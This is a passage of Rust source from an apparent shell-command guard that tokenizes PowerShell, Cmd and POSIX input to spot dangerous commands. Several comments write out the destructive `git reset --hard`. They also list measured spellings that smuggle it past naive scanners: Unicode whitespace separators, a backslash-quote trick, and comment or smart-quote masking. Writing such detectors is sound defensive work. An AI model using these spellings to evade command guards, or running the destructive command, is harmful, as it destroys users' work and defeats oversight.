        if bytes[j..end].starts_with(b"::") {
            let name_end = powershell_member_name_end(bytes, j + 2, end, across)?;
            return powershell_member_chain_end(bytes, name_end, end, across);
        }
    }
    loop {
        j = powershell_variable_end(bytes, j, end, across)?;
        j = powershell_member_chain_end(bytes, j, end, across)?;
        if j < end && bytes[j] == b',' {
            j += 1;
            if word_ends(j) {
                return Some(j);
            }
            continue;
        }
        return Some(j);
    }
}

/// Position after the `]` or `}` that closes the `[` or `${` at `i`: within
/// `end`, or where `across` says.
fn powershell_closing_end(
    bytes: &[u8],
    i: usize,
    end: usize,
    across: Option<&HashMap<usize, usize>>,
) -> Option<usize> {
    match across {
        Some(closes) => closes.get(&i).copied(),
        None if bytes[i] == b'[' => powershell_bracket_end(bytes, i, end),
        None => braced_variable_end(bytes, i, end),
    }
}

/// End of the variable (`$c`, `${c}`, `$env:C`, `$cé`) that starts at `j`.
fn powershell_variable_end(
    bytes: &[u8],
    j: usize,
    end: usize,
    across: Option<&HashMap<usize, usize>>,
) -> Option<usize> {
    if j >= end || bytes[j] != b'$' {
        return None;
    }
    if bytes.get(j + 1) == Some(&b'{') {
        return powershell_closing_end(bytes, j, end, across);
    }
    // `?` belongs to a variable name, except where `??=` begins.
    let mut k = j + 1;
    while k < end {
        if matches!(bytes[k], b':' | b'?') && !bytes[k..end].starts_with(b"??=") {
            k += 1;
        } else if let Some(width) = powershell_name_char_len(bytes, k, end) {
            k += width;
        } else {
            break;
        }
    }
    (k > j + 1).then_some(k)
}

/// End of the `.name` and `[index]` members that follow position `j`.
fn powershell_member_chain_end(
    bytes: &[u8],
    mut j: usize,
    end: usize,
    across: Option<&HashMap<usize, usize>>,
) -> Option<usize> {
    while j < end {
        match bytes[j] {
            b'.' => match powershell_member_name_end(bytes, j + 1, end, across) {
                Some(name_end) => j = name_end,
                None => break,
            },
            b'[' => j = powershell_closing_end(bytes, j, end, across)?,
            _ => break,
        }
    }
    Some(j)
}

/// End of a member or hashtable-key name at `i`: a bare name (`p`, `é`), a
/// quoted one (`'p'`, `"p"`) or a variable (`$n`).
fn powershell_member_name_end(
    bytes: &[u8],
    i: usize,
    end: usize,
    across: Option<&HashMap<usize, usize>>,
) -> Option<usize> {
    match bytes.get(i).filter(|_| i < end)? {
        b'\'' | b'"' => Some(powershell_quoted_end(bytes, i, end)),
        b'$' => powershell_variable_end(bytes, i, end, across),
        _ => {
            let mut k = i;
            while let Some(width) = powershell_name_char_len(bytes, k, end) {
                k += width;
            }
            (k > i).then_some(k)
        }
    }
}

/// Byte width of the name character (a Unicode letter or digit, or `_`) at
/// `k`, if one is there.
fn powershell_name_char_len(bytes: &[u8], k: usize, end: usize) -> Option<usize> {
    let lead = *bytes.get(k).filter(|_| k < end)?;
    if lead.is_ascii() {
        return (lead.is_ascii_alphanumeric() || lead == b'_').then_some(1);
    }
    let width = match lead {
        0xc0..=0xdf => 2,
        0xe0..=0xef => 3,
        0xf0..=0xf7 => 4,
        _ => return None,
    };
    let character = std::str::from_utf8(bytes.get(k..k + width)?)
        .ok()?
        .chars()
        .next()?;
    (k + width <= end && character.is_alphanumeric()).then_some(width)
}

/// Position after the `]` that closes the `[` at `i`, within `end`.
fn powershell_bracket_end(bytes: &[u8], i: usize, end: usize) -> Option<usize> {
    let mut depth = 0usize;
    let mut j = i;
    while j < end {
        match bytes[j] {
            b'[' => depth += 1,
            b']' => {
                depth -= 1;
                if depth == 0 {
                    return Some(j + 1);
                }
            }
            b'\'' | b'"' => {
                j = powershell_quoted_end(bytes, j, end);
                continue;
            }
            _ => {}
        }
        j += 1;
    }
    None
}

/// Position after the `}` that closes the braced variable `${…}` at `i`.
fn braced_variable_end(bytes: &[u8], i: usize, end: usize) -> Option<usize> {
    let mut j = i + 2;
    while j < end {
        match bytes[j] {
            b'`' => j = consume_shell_escape(bytes, j, end),
            b'}' => return Some(j + 1),
            _ => j += 1,
        }
    }
    None
}

/// Position after the single- or double-quoted string that opens at `i`
/// (`''` and `""` are quote characters inside it), or `end` when unclosed.
fn powershell_quoted_end(bytes: &[u8], i: usize, end: usize) -> usize {
    let quote = bytes[i];
    let mut j = i + 1;
    while j < end {
        if quote == b'"' && bytes[j] == b'`' {
            j = consume_shell_escape(bytes, j, end);
        } else if bytes[j] == quote {
            if bytes.get(j + 1) == Some(&quote) && j + 1 < end {
                j += 2;
            } else {
                return j + 1;
            }
        } else {
            j += 1;
        }
    }
    end
}

/// Read PowerShell comments and smart quotes in a separate deny-only view.
/// Masked comments preserve line ends; block-comment line ends are spaces.
/// Smart quotes use their ASCII spelling so the existing readers see them.
pub(crate) fn mask_powershell_comments(command: &str) -> Option<String> {
    let has_smart_quotes = command
        .chars()
        .any(|c| matches!(c, '\u{2018}'..='\u{201e}'));
    if has_smart_quotes {
        let spelled: String = command
            .chars()
            .map(|c| match c {
                '\u{2018}'..='\u{201b}' => '\'',
                '\u{201c}'..='\u{201e}' => '"',
                _ => c,
            })
            .collect();
        Some(
            tokenize_powershell_with_comments(&spelled, true)
                .1
                .unwrap_or(spelled),
        )
    } else {
        tokenize_powershell_with_comments(command, true).1
    }
}

fn tokenize_powershell_with_comments(
    command: &str,
    read_comments: bool,
) -> (NormalizeTokens, Option<String>) {
    let _phase = crate::perf::phase(crate::perf::ProfilePhase::ShellTokenization);
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut tokens = NormalizeTokens::new();
    let mut masked: Option<Vec<u8>> = None;
    let mut i = 0usize;
    let mut literal_mode = false;

    while i < len {
        i = skip_powershell_horizontal_whitespace(bytes, i, len);
        if i >= len {
            break;
        }

        // A backtick immediately followed by a physical newline is a
        // PowerShell line continuation, not an argv word.  When it occurs at
        // a token boundary (for example, `& ` followed by `` `\r\n $block``),
        // consuming it as a zero-width decoded Word hides the real operand
        // from callers that intentionally inspect the next syntax token.
        // Continuations embedded inside a word remain part of that raw word
        // and are decoded by `ShellTokenDecoder` below.
        if !literal_mode
            && bytes.get(i) == Some(&b'`')
            && let Some(end) = powershell_line_continuation_end(bytes, i, len)
        {
            i = end;
            continue;
        }

        if let Some(end) = consume_raw_newline(bytes, i, len, &mut tokens) {
            // PowerShell's stop-parsing mode ends at the physical newline.
            literal_mode = false;
            i = end;
            continue;
        }

        if read_comments && !literal_mode && bytes[i] == b'#' {
            let start = i;
            while i < len && !matches!(bytes[i], b'\r' | b'\n') {
                i += 1;
            }
            masked.get_or_insert_with(|| bytes.to_vec())[start..i].fill(b' ');
            continue;
        }
        if read_comments && !literal_mode && bytes.get(i..i + 2) == Some(b"<#") {
            let start = i;
            i += 2;
            while i < len && bytes.get(i..i + 2) != Some(b"#>") {
                i += 1;
            }
            i = (i + 2).min(len);
            masked.get_or_insert_with(|| bytes.to_vec())[start..i].fill(b' ');
            continue;
        }

        if !literal_mode {
            if let Some(end) = consume_powershell_separator(bytes, i, len, &mut tokens) {
                i = end;
                continue;
            }
        } else if let Some(end) = powershell_pipeline_end(bytes, i, len) {
            i = push_raw_separator(&mut tokens, i, end);
            literal_mode = false;
            continue;
        }

        let start = i;
        i = if literal_mode {
            consume_powershell_literal_word(bytes, i, len)
        } else {
            consume_powershell_word(bytes, i, len, read_comments)
        };

        if start == i {
            // Defensive progress guarantee for malformed or future syntax.
            i += 1;
            continue;
        }

        tokens.push(NormalizeToken {
            kind: NormalizeTokenKind::Word,
            byte_range: start..i,
        });

        if !literal_mode && powershell_word_stops_parsing(&command[start..i]) {
            literal_mode = true;
        }
    }

    let masked = masked.map(|bytes| {
        String::from_utf8(bytes).expect("masking whole comment bytes preserves UTF-8")
    });
    (tokens, masked)
}

#[inline]
fn powershell_line_continuation_end(bytes: &[u8], i: usize, len: usize) -> Option<usize> {
    if bytes.get(i) != Some(&b'`') {
        return None;
    }
    match bytes.get(i + 1) {
        Some(b'\n') => Some(i + 2),
        Some(b'\r') if i + 2 < len && bytes.get(i + 2) == Some(&b'\n') => Some(i + 3),
        _ => None,
    }
}

#[inline]
fn cmd_line_continuation_end(bytes: &[u8], i: usize, len: usize) -> Option<usize> {
    if bytes.get(i) != Some(&b'^') {
        return None;
    }
    raw_newline_end(bytes, i + 1, len)
}

fn tokenize_cmd_raw(command: &str) -> NormalizeTokens {
    let _phase = crate::perf::phase(crate::perf::ProfilePhase::ShellTokenization);
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut tokens = NormalizeTokens::new();
    let mut i = 0usize;

    while i < len {
        i = skip_shell_horizontal_whitespace(bytes, i, len);
        if i >= len {
            break;
        }

        // Like PowerShell's backtick continuation, a caret-newline at a
        // token boundary is shell syntax rather than an empty argv word.
        if let Some(end) = cmd_line_continuation_end(bytes, i, len) {
            i = end;
            continue;
        }

        if let Some(end) = consume_raw_newline(bytes, i, len, &mut tokens) {
            i = end;
            continue;
        }
        if bytes[i] == b'('
            && tokens.last().is_some_and(|previous| {
                previous.kind == NormalizeTokenKind::Word
                    && previous.byte_range.end == i
                    && previous.text(command).is_some_and(|raw| {
                        decode_cmd_syntax_token(raw).eq_ignore_ascii_case("echo")
                    })
            })
        {
            // `echo(` is Cmd's idiomatic no-space echo form; this parenthesis
            // is argument syntax, not a command-group boundary. Emit it as a
            // data word so the Cmd safe-argument masker owns the printed tail.
            tokens.push(NormalizeToken {
                kind: NormalizeTokenKind::Word,
                byte_range: i..i + 1,
            });
            i += 1;
            continue;
        }
        if let Some(end) = consume_cmd_separator(bytes, i, len, &mut tokens) {
            i = end;
            continue;
        }

        let start = i;
        i = consume_cmd_word(bytes, i, len);
        if start == i {
            // Defensive progress guarantee for malformed or future syntax.
            i += 1;
            continue;
        }
        tokens.push(NormalizeToken {
            kind: NormalizeTokenKind::Word,
            byte_range: start..i,
        });
    }

    tokens
}

#[inline]
fn skip_shell_horizontal_whitespace(bytes: &[u8], mut i: usize, len: usize) -> usize {
    while i < len && bytes[i].is_ascii_whitespace() && !matches!(bytes[i], b'\r' | b'\n') {
        i += 1;
    }
    i
}

/// Byte length of the PowerShell word separator that starts at `i`, if any.
///
/// PowerShell separates words on every Unicode `White_Space` character except
/// the line breaks `\r` and `\n`: its tokenizer's `IsWhitespace` takes ASCII
/// space, tab, vertical tab and form feed, U+0085 and U+00A0, and every Zs, Zl
/// and Zp character. That is `char::is_whitespace` without the line breaks.
/// Measured with PowerShell 7.5: `git<VT>reset<VT>--hard`, the U+00A0, U+3000,
/// U+2028 and U+0085 spellings all run `git reset --hard`, while U+200B,
/// U+FEFF and U+180E stay inside the word. Every such character's UTF-8 lead
/// byte is ASCII, 0xC2 or 0xE1..=0xE3, so a scan that steps byte by byte
/// meets the lead byte first.
#[inline]
fn powershell_horizontal_space_len(bytes: &[u8], i: usize) -> Option<usize> {
    let lead = *bytes.get(i)?;
    let width = match lead {
        b' ' | b'\t' | 0x0b | 0x0c => return Some(1),
        0xc2 => 2,
        0xe1..=0xe3 => 3,
        _ => return None,
    };
    let character = std::str::from_utf8(bytes.get(i..i + width)?)
        .ok()?
        .chars()
        .next()?;
    character.is_whitespace().then_some(width)
}

/// Whether a PowerShell word separator ends just before `index`.
#[inline]
fn powershell_horizontal_space_ends_at(bytes: &[u8], index: usize) -> bool {
    (1..=3).any(|width| {
        index
            .checked_sub(width)
            .is_some_and(|start| powershell_horizontal_space_len(bytes, start) == Some(width))
    })
}

#[inline]
fn skip_powershell_horizontal_whitespace(bytes: &[u8], mut i: usize, len: usize) -> usize {
    while i < len
        && let Some(width) = powershell_horizontal_space_len(bytes, i)
    {
        i += width;
    }
    i
}

fn consume_raw_newline(
    bytes: &[u8],
    i: usize,
    len: usize,
    tokens: &mut NormalizeTokens,
) -> Option<usize> {
    let end = raw_newline_end(bytes, i, len)?;
    tokens.push(NormalizeToken {
        kind: NormalizeTokenKind::Separator,
        byte_range: i..end,
    });
    Some(end)
}

#[inline]
fn raw_newline_end(bytes: &[u8], i: usize, len: usize) -> Option<usize> {
    match bytes.get(i)? {
        b'\r' if i + 1 < len && bytes[i + 1] == b'\n' => Some(i + 2),
        b'\r' | b'\n' => Some(i + 1),
        _ => None,
    }
}

fn push_raw_separator(tokens: &mut NormalizeTokens, start: usize, end: usize) -> usize {
    tokens.push(NormalizeToken {
        kind: NormalizeTokenKind::Separator,
        byte_range: start..end,
    });
    end
}

fn consume_powershell_separator(
    bytes: &[u8],
    i: usize,
    len: usize,
    tokens: &mut NormalizeTokens,
) -> Option<usize> {
    let end = match bytes[i] {
        b'|' if i + 1 < len && matches!(bytes[i + 1], b'|' | b'&') => i + 2,
        b'|' | b'&' if i + 1 < len && bytes[i + 1] == bytes[i] => i + 2,
        b'&' if i + 1 < len && bytes[i + 1] == b'>' => return None,
        b'|' | b'&' | b';' | b'(' | b')' => i + 1,
        _ => return None,
    };
    Some(push_raw_separator(tokens, i, end))
}

fn consume_cmd_separator(
    bytes: &[u8],
    i: usize,
    len: usize,
    tokens: &mut NormalizeTokens,
) -> Option<usize> {
    let end = cmd_separator_end(bytes, i, len)?;
    Some(push_raw_separator(tokens, i, end))
}

#[inline]
fn consume_shell_escape(bytes: &[u8], i: usize, len: usize) -> usize {
    // Both PowerShell's backtick and Cmd's caret consume a CRLF physical
    // newline as one continuation unit.  Consuming only the escape plus `\r`
    // would expose the remaining `\n` as a command boundary and split a word
    // that the shell joins.  LF-only continuations already take the ordinary
    // two-byte path.
    if i + 2 < len && bytes[i + 1] == b'\r' && bytes[i + 2] == b'\n' {
        i + 3
    } else {
        (i + 2).min(len)
    }
}

/// A `<#` inside a word starts a block comment when the byte before it would
/// let a `#` start a line comment, including after an operator or closing
/// quote. `a<#x#>` stays text.
fn powershell_block_comment_starts_after(bytes: &[u8], i: usize) -> bool {
    bytes.get(i..i + 2) == Some(b"<#")
        && powershell_comment_predecessor_role(bytes, i) != PowerShellHashRole::Literal
}

fn consume_powershell_word(bytes: &[u8], mut i: usize, len: usize, read_comments: bool) -> usize {
    let mut quote = PowerShellQuote::Unquoted;

    while i < len {
        let byte = bytes[i];
        match quote {
            PowerShellQuote::Unquoted => {
                if matches!(byte, b'\r' | b'\n')
                    || powershell_horizontal_space_len(bytes, i).is_some()
                    || powershell_separator_end(bytes, i, len).is_some()
                    || (read_comments
                        && byte == b'#'
                        && powershell_hash_role(bytes, i) == PowerShellHashRole::Comment)
                    || (read_comments && powershell_block_comment_starts_after(bytes, i))
                {
                    break;
                }
                match byte {
                    b'`' => i = consume_shell_escape(bytes, i, len),
                    b'$' if read_comments && bytes.get(i + 1) == Some(&b'{') => {
                        // Braced variable names may contain spaces and `#`.
                        // Neither starts a comment until the closing brace.
                        i += 2;
                        while i < len && bytes[i] != b'}' {
                            i = if bytes[i] == b'`' {
                                consume_shell_escape(bytes, i, len)
                            } else {
                                i + 1
                            };
                        }
                        i = (i + 1).min(len);
                    }
                    b'@' => {
                        i = consume_powershell_here_string(bytes, i, len).unwrap_or(i + 1);
                    }
                    b'\'' => {
                        quote = PowerShellQuote::Single;
                        i += 1;
                    }
                    b'"' => {
                        quote = PowerShellQuote::Double;
                        i += 1;
                    }
                    _ => i += 1,
                }
            }
            PowerShellQuote::Single => {
                if byte == b'\'' {
                    if i + 1 < len && bytes[i + 1] == b'\'' {
                        i += 2;
                    } else {
                        quote = PowerShellQuote::Unquoted;
                        i += 1;
                    }
                } else {
                    i += 1;
                }
            }
            PowerShellQuote::Double => match byte {
                b'`' => i = consume_shell_escape(bytes, i, len),
                b'"' => {
                    quote = PowerShellQuote::Unquoted;
                    i += 1;
                }
                _ => i += 1,
            },
        }
    }

    i
}

/// Consume a PowerShell single- or double-quoted here-string as one raw word.
///
/// A here-string header is `@'` or `@"`, followed only by horizontal
/// whitespace and a physical newline. Its closing mark is the matching quote
/// plus `@` at the start of a later line; PowerShell does not permit the
/// closing mark to be indented. Quotes and separators in the body are literal
/// to this tokenizer. If a syntactically valid header has no closing mark, the
/// rest of the input is kept in one word so malformed input cannot expose
/// body text as executable command segments.
fn consume_powershell_here_string(bytes: &[u8], start: usize, len: usize) -> Option<usize> {
    if bytes.get(start) != Some(&b'@') {
        return None;
    }
    let quote = *bytes.get(start + 1)?;
    if !matches!(quote, b'\'' | b'"') {
        return None;
    }

    let header_newline = skip_powershell_header_whitespace(bytes, start + 2, len);
    let mut line_start = raw_newline_end(bytes, header_newline, len)?;

    while line_start < len {
        if bytes.get(line_start) == Some(&quote) && bytes.get(line_start + 1) == Some(&b'@') {
            return Some(line_start + 2);
        }

        let mut newline_start = line_start;
        while newline_start < len && !matches!(bytes[newline_start], b'\r' | b'\n') {
            newline_start += 1;
        }
        let Some(next_line_start) = raw_newline_end(bytes, newline_start, len) else {
            return Some(len);
        };
        line_start = next_line_start;
    }

    Some(len)
}

/// `command` with every backslash spelled `/`, or `None` unless that moves a
/// POSIX command boundary.
///
/// PowerShell has no backslash escape: `"C:\temp\"` is a complete string
/// there (it escapes with a backtick). dcg's shared scanners read `\"` as an
/// escaped quote, so the string ran on over `; git reset --hard` in
/// `Write-Output "C:\temp\"; git reset --hard`. A backslash means nothing to
/// PowerShell, and `/` is the other path separator Windows accepts, so this
/// length-preserving spelling parses the same for PowerShell, while the
/// POSIX scanners now find the separators PowerShell finds. A backslash
/// before an ASCII letter, digit, `.`, `-` or `_` cannot move a boundary, so
/// such paths skip the comparison.
pub(crate) fn without_backslash_escapes(command: &str) -> Option<String> {
    let bytes = command.as_bytes();
    let may_move_a_boundary = memchr::memchr_iter(b'\\', bytes).any(|at| {
        !bytes
            .get(at + 1)
            .is_some_and(|next| next.is_ascii_alphanumeric() || b".-_".contains(next))
    });
    if !may_move_a_boundary {
        return None;
    }
    let spelled = command.replace('\\', "/");
    // Segments that follow a separator; a substitution (`\$(id)` in Bash
    // prose) is a segment too, but no separator precedes it.
    let starts = |text: &str| -> Vec<usize> {
        crate::packs::split_command_segments(text)
            .iter()
            .map(|segment| (segment.as_ptr() as usize).saturating_sub(text.as_ptr() as usize))
            .filter(|start| {
                text[..*start]
                    .trim_end_matches(|c: char| c.is_whitespace() && c != '\n')
                    .ends_with([';', '&', '|', '\n'])
            })
            .collect()
    };
    (starts(&spelled) != starts(command)).then_some(spelled)
}

fn skip_powershell_header_whitespace(bytes: &[u8], mut i: usize, len: usize) -> usize {
    while i < len {
        let width = match bytes[i] {
            0x00..=0x7f => 1,
            0xc2..=0xdf => 2,
            0xe0..=0xef => 3,
            0xf0..=0xf4 => 4,
            _ => break,
        };
        let Some(encoded) = bytes.get(i..i + width) else {
            break;
        };
        let Ok(encoded) = std::str::from_utf8(encoded) else {
            break;
        };
        let Some(character) = encoded.chars().next() else {
            break;
        };
        if matches!(character, '\r' | '\n') || !character.is_whitespace() {
            break;
        }
        i += character.len_utf8();
    }
    i
}

fn powershell_separator_end(bytes: &[u8], i: usize, len: usize) -> Option<usize> {
    match bytes[i] {
        b'|' if i + 1 < len && matches!(bytes[i + 1], b'|' | b'&') => Some(i + 2),
        b'|' | b'&' if i + 1 < len && bytes[i + 1] == bytes[i] => Some(i + 2),
        b'&' if i + 1 < len && bytes[i + 1] == b'>' => None,
        b'|' | b'&' | b';' | b'(' | b')' => Some(i + 1),
        _ => None,
    }
}

fn consume_powershell_literal_word(bytes: &[u8], mut i: usize, len: usize) -> usize {
    let mut quote: Option<u8> = None;

    while i < len {
        let byte = bytes[i];
        if matches!(byte, b'\r' | b'\n') {
            break;
        }
        if quote.is_none() {
            if byte.is_ascii_whitespace() || powershell_pipeline_end(bytes, i, len).is_some() {
                break;
            }
        }
        if matches!(byte, b'\'' | b'"') {
            quote = if quote == Some(byte) {
                None
            } else if quote.is_none() {
                Some(byte)
            } else {
                quote
            };
        }
        i += 1;
    }

    i
}

fn powershell_pipeline_end(bytes: &[u8], i: usize, len: usize) -> Option<usize> {
    if bytes[i] != b'|' {
        return None;
    }
    Some(if i + 1 < len && matches!(bytes[i + 1], b'|' | b'&') {
        i + 2
    } else {
        i + 1
    })
}

fn consume_cmd_word(bytes: &[u8], mut i: usize, len: usize) -> usize {
    let mut in_double_quotes = false;

    while i < len {
        let byte = bytes[i];
        if !in_double_quotes {
            if byte.is_ascii_whitespace() || cmd_separator_end(bytes, i, len).is_some() {
                break;
            }
            match byte {
                b'^' => i = consume_shell_escape(bytes, i, len),
                b'"' => {
                    in_double_quotes = true;
                    i += 1;
                }
                _ => i += 1,
            }
        } else if byte == b'"' {
            in_double_quotes = false;
            i += 1;
        } else {
            // Carets are literal inside Cmd double quotes.
            i += 1;
        }
    }

    i
}

fn cmd_separator_end(bytes: &[u8], i: usize, len: usize) -> Option<usize> {
    match bytes[i] {
        // In Cmd redirection, the ampersand in `2>&1` / `<&0` duplicates a
        // file descriptor; it is not a command separator. This check is also
        // used while consuming a word, where the immediately preceding
        // redirect byte is available. An escaped redirect (`^>&`) is ordinary
        // argument data, however, so its following `&` remains a separator.
        b'&' if i > 0
            && matches!(bytes[i - 1], b'<' | b'>')
            && !cmd_byte_is_caret_escaped(bytes, i - 1) =>
        {
            None
        }
        b'|' | b'&' if i + 1 < len && bytes[i + 1] == bytes[i] => Some(i + 2),
        b'|' | b'&' | b'(' | b')' => Some(i + 1),
        _ => None,
    }
}

fn cmd_byte_is_caret_escaped(bytes: &[u8], index: usize) -> bool {
    let mut cursor = index;
    while cursor > 0 && bytes[cursor - 1] == b'^' {
        cursor -= 1;
    }
    (index - cursor) % 2 == 1
}

#[must_use]
pub fn tokenize_for_normalization(command: &str) -> NormalizeTokens {
    tokenize_normalization_inner(command, false)
}

/// With `posix_comments`, a `#` where a word starts is a comment to the end
/// of its line (the newline stays a separator), so a quote inside it opens no
/// string that would hide the next line.
fn tokenize_normalization_inner(command: &str, posix_comments: bool) -> NormalizeTokens {
    let _phase = crate::perf::phase(crate::perf::ProfilePhase::ShellTokenization);
    let bytes = command.as_bytes();
    let len = bytes.len();

    let mut tokens = NormalizeTokens::new();
    let mut i = 0;
    let mut braces = BraceLookup::default();
    // Where a `#` right after a `(` or `)` stays in a word (`x=(1 2)#`,
    // `ls *(#)`); see [`crate::context::PosixParens`].
    let mut parens = crate::context::PosixParens::default();
    let mut word_continues_at = None;

    while i < len {
        if posix_comments {
            while i < len && matches!(bytes[i], b' ' | b'\t') {
                i += 1;
            }
        } else {
            i = skip_ascii_whitespace(bytes, i, len);
        }
        if i >= len {
            break;
        }

        if posix_comments && bytes[i] == b'#' && word_continues_at != Some(i) {
            while i < len && bytes[i] != b'\n' {
                i += 1;
            }
            continue;
        }
        // A line continuation between words is removed, so a word still
        // starts after it (`echo a \` LF `# it's` is a comment).
        if posix_comments && bytes[i] == b'\\' && bytes.get(i + 1) == Some(&b'\n') {
            i += 2;
            continue;
        }

        if bytes[i] == b'\n' {
            tokens.push(NormalizeToken {
                kind: NormalizeTokenKind::Separator,
                byte_range: i..i + 1,
            });
            i += 1;
            continue;
        }

        if let Some(end) = consume_separator_token(bytes, i, len, &mut tokens) {
            if posix_comments {
                let word_follows = match bytes[i] {
                    b'(' => parens.open(bytes, i),
                    b')' => parens.close(),
                    _ => true,
                };
                if !word_follows {
                    word_continues_at = Some(end);
                }
            }
            i = end;
            continue;
        }

        let start = i;
        let end = consume_word_token_inner(bytes, i, len, false, posix_comments, &mut braces);
        i = end;

        if start < i {
            tokens.push(NormalizeToken {
                kind: NormalizeTokenKind::Word,
                byte_range: start..i,
            });
        }
    }

    tokens
}

#[inline]
#[must_use]
pub fn skip_ascii_whitespace(bytes: &[u8], mut i: usize, len: usize) -> usize {
    while i < len && bytes[i].is_ascii_whitespace() && bytes[i] != b'\n' {
        i += 1;
    }
    i
}

#[inline]
pub fn consume_separator_token(
    bytes: &[u8],
    i: usize,
    len: usize,
    tokens: &mut NormalizeTokens,
) -> Option<usize> {
    match bytes[i] {
        b'|' => {
            let end = if i + 1 < len && bytes[i + 1] == b'|' {
                i + 2
            } else {
                i + 1
            };
            tokens.push(NormalizeToken {
                kind: NormalizeTokenKind::Separator,
                byte_range: i..end,
            });
            Some(end)
        }
        b';' | b'(' | b')' => {
            tokens.push(NormalizeToken {
                kind: NormalizeTokenKind::Separator,
                byte_range: i..i + 1,
            });
            Some(i + 1)
        }
        b'&' if i + 1 < len && bytes[i + 1] == b'>' => None,
        b'&' => {
            let end = if i + 1 < len && bytes[i + 1] == b'&' {
                i + 2
            } else {
                i + 1
            };
            tokens.push(NormalizeToken {
                kind: NormalizeTokenKind::Separator,
                byte_range: i..end,
            });
            Some(end)
        }
        _ => None,
    }
}

#[inline]
#[must_use]
pub fn is_env_assignment(word: &str) -> bool {
    let Some((lhs, _value)) = word.split_once('=') else {
        return false;
    };
    let lhs = lhs.strip_suffix('+').unwrap_or(lhs);
    let name = lhs.split_once('[').map_or(lhs, |(name, subscript)| {
        if subscript.len() <= 1 || !subscript.ends_with(']') {
            return "";
        }
        name
    });
    let mut bytes = name.bytes();
    bytes
        .next()
        .is_some_and(|byte| byte.is_ascii_alphabetic() || byte == b'_')
        && bytes.all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NormalizeWrapper {
    None,
    Sudo { options_ended: bool, skip_next: u8 },
    Env { options_ended: bool, skip_next: u8 },
    Command { options_ended: bool, skip_next: u8 },
    CommandQuery,
}

impl NormalizeWrapper {
    #[inline]
    #[must_use]
    pub fn from_command_word(word: &str) -> Option<Self> {
        let base_name = word.rsplit('/').next().unwrap_or(word);
        match base_name {
            "sudo" => Some(Self::Sudo {
                options_ended: false,
                skip_next: 0,
            }),
            "env" => Some(Self::Env {
                options_ended: false,
                skip_next: 0,
            }),
            "command" => Some(Self::Command {
                options_ended: false,
                skip_next: 0,
            }),
            _ => None,
        }
    }

    #[inline]
    #[must_use]
    pub fn should_skip_token(self, word: &str) -> bool {
        match self {
            Self::None | Self::CommandQuery => false,
            Self::Sudo {
                options_ended,
                skip_next,
            }
            | Self::Env {
                options_ended,
                skip_next,
            }
            | Self::Command {
                options_ended,
                skip_next,
            } => {
                if skip_next > 0 {
                    return true;
                }
                if !options_ended && word == "--" {
                    return true;
                }
                !options_ended && word.starts_with('-')
            }
        }
    }

    #[inline]
    #[must_use]
    fn advance_sudo(mut options_ended: bool, mut skip_next: u8, word: &str) -> Self {
        if skip_next > 0 {
            skip_next = skip_next.saturating_sub(1);
            return Self::Sudo {
                options_ended,
                skip_next,
            };
        }
        if !options_ended && word == "--" {
            options_ended = true;
            return Self::Sudo {
                options_ended,
                skip_next,
            };
        }
        if !options_ended && word.starts_with('-') {
            // Options that take an argument: -u USER, -g GROUP, -h HOST, -p PROMPT
            // Also support attached args: -uUSER, -gGROUP, etc (no extra token to skip).
            let takes_value = matches!(word, "-u" | "-g" | "-h" | "-p")
                || word.starts_with("-u")
                || word.starts_with("-g")
                || word.starts_with("-h")
                || word.starts_with("-p");
            if takes_value && word.len() == 2 {
                skip_next = 1;
            }
            return Self::Sudo {
                options_ended,
                skip_next,
            };
        }
        Self::Sudo {
            options_ended,
            skip_next,
        }
    }

    #[inline]
    #[must_use]
    fn advance_env(mut options_ended: bool, mut skip_next: u8, word: &str) -> Self {
        if skip_next > 0 {
            skip_next = skip_next.saturating_sub(1);
            return Self::Env {
                options_ended,
                skip_next,
            };
        }
        if !options_ended && word == "--" {
            options_ended = true;
            return Self::Env {
                options_ended,
                skip_next,
            };
        }
        if !options_ended && word.starts_with('-') {
            // `env -u NAME ...` unsets a variable (takes an argument).
            let takes_value = word == "-u" || word == "--unset" || word.starts_with("-u");
            if takes_value && (word == "-u" || word == "--unset") {
                skip_next = 1;
            }
            return Self::Env {
                options_ended,
                skip_next,
            };
        }
        Self::Env {
            options_ended,
            skip_next,
        }
    }

    #[inline]
    #[must_use]
    fn advance_command(mut options_ended: bool, skip_next: u8, word: &str) -> Self {
        let mut skip_next = skip_next;
        if skip_next > 0 {
            skip_next = skip_next.saturating_sub(1);
            return Self::Command {
                options_ended,
                skip_next,
            };
        }
        if !options_ended && word == "--" {
            options_ended = true;
            return Self::Command {
                options_ended,
                skip_next,
            };
        }
        if !options_ended && word.starts_with('-') {
            // `command -v/-V` queries command resolution (not a wrapper execution).
            if matches!(word, "-v" | "-V") {
                return Self::CommandQuery;
            }
            // `command -p` is wrapper-like (no value).
            return Self::Command {
                options_ended,
                skip_next,
            };
        }
        Self::Command {
            options_ended,
            skip_next,
        }
    }

    #[inline]
    #[must_use]
    pub fn advance(self, word: &str) -> Self {
        match self {
            Self::Sudo {
                options_ended,
                skip_next,
            } => Self::advance_sudo(options_ended, skip_next, word),
            Self::Env {
                options_ended,
                skip_next,
            } => Self::advance_env(options_ended, skip_next, word),
            Self::Command {
                options_ended,
                skip_next,
            } => Self::advance_command(options_ended, skip_next, word),
            Self::None | Self::CommandQuery => self,
        }
    }
}

#[must_use]
#[allow(clippy::too_many_lines)]
#[allow(clippy::while_let_on_iterator)]
fn normalize_command_word_token_in_dialect(token: &str, dialect: ShellDialect) -> Option<String> {
    let mut out = token.to_string();
    let windows_shell = matches!(dialect, ShellDialect::PowerShell | ShellDialect::Cmd);

    // Strip line continuations (backslash + newline) anywhere in the token
    let mut changed = if out.contains("\\\n") || out.contains("\\\r\n") {
        out = out.replace("\\\n", "").replace("\\\r\n", "");
        true
    } else {
        false
    };

    let stripped = out.trim_start_matches('\\');
    if !windows_shell && !stripped.is_empty() && stripped.len() != out.len() {
        // Only strip leading backslashes when it looks like an escaped command word.
        // This avoids turning escaped quotes (e.g., `\"`) into real quotes, which can
        // change tokenization on subsequent normalization passes.
        let first = stripped.as_bytes()[0];
        let looks_like_command =
            first.is_ascii_alphanumeric() || matches!(first, b'/' | b'.' | b'_' | b'~');
        if looks_like_command {
            out = stripped.to_string();
            changed = true;
        }
    }

    // Windows drive-letter paths (e.g. `C:\Windows\System32\diskpart.exe`) use the
    // backslash as a PATH SEPARATOR, not a bash escape. Stripping it would mangle
